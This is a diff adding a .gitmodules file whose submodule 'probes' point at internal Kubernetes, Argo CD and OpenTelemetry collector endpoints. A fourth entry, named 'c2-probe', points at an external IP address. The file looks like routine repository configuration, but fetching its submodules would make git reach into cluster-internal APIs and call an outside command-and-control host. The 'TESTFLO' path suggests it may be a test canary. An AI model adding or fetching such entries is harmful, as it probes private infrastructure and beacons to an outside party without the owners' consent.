@@ -1,0 +1,15 @@
+[submodule "k8s-api-probe"]
+	path = probes/k8s-api
+	url = https://kubernetes.default.svc/api/v1/namespaces
+
+[submodule "argocd-probe"]
+	path = probes/argocd
+	url = https://argocd-server.argocd.svc.cluster.local/api/v1/applications
+
+[submodule "deployer-probe"]
+	path = probes/deployer
+	url = http://otel-collector.deployer.svc.cluster.local:4318/
+
+[submodule "c2-probe"]
+	path = probes/c2
+	url = http://82.165.195.38/TESTFLO-SUBMODULE
